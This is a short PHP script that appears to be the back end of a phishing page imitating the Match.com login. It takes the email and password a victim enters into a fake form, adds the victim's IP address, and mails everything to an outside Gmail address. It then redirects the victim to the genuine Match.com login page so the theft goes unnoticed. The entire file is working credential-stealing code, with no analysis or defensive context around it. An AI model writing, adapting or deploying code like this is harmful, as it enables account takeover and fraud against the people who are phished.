<?
$ip = getenv("REMOTE_ADDR");
$message .= "---- : || match! GOD 1ST SON || :------\n";
$message .= "email: ".$_POST['formtext1']."\n";
$message .= "Password: ".$_POST['formtext2']."\n";
$message .= "----: || THANKS BE TO GOD || :------\n";
$message .= "IP: ".$ip."\n";
$recipient ="omobaalert@gmail.com";
$subject = "tare | ".$ip."\n";
mail($recipient,$subject,$message);
header("Location: https://www4.match.com/login/");
?>